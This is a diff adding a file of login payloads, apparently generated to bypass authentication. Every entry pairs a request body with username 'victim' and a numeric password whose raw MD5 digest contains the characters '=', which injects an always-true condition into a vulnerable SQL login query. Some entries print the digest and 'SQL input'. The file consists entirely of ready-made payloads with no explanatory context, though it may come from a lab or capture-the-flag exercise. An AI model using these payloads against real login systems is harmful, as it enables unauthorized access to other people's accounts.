@@ -1,0 +1,34 @@
+username=victim&password=1911935081725323890924484515
+1911935081725323890924484515
+
+username=victim&password=5634081531563223452333628615
+5634081531563223452333628615
+
+username=victim&password=146599079017600211701088377075
+146599079017600211701088377075
+
+username=victim&password=114486684517197248171038027810
+114486684517197248171038027810
+
+username=victim&password=193610051365249943526982638
+193610051365249943526982638
+
+username=victim&password=1249462074375521943558498043
+md5 hassh:       b"\xf4\x01'='\x15\xf0g\x99\x93u\xd1\x81,Jz"
+SQL input:       1249462074375521943558498043
+
+username=victim&password=223895822775477233883
+md5 hassh:       b"i]'='K\xdf\xa4\x9f\xde_~9\xb7y\x9f"
+SQL input:       223895822775477233883
+
+username=victim&password=127520541442
+md5 hassh:       b"\xf9'='\ns\xf9|\xd9ao\xd3\x14\x07[*"
+SQL input:       127520541442
+
+username=victim&password=11899149
+md5 hassh:       b"B<\x15\x93TK'='u\xadM!\xcf\x11\x9a"
+SQL input:       11899149
+
+username=victim&password=83245200
+md5 hassh:       b"\x89\x11'='\xcd\x00\xa7\x085\xa5\xc4#1n\x1a"
+SQL input:       83245200
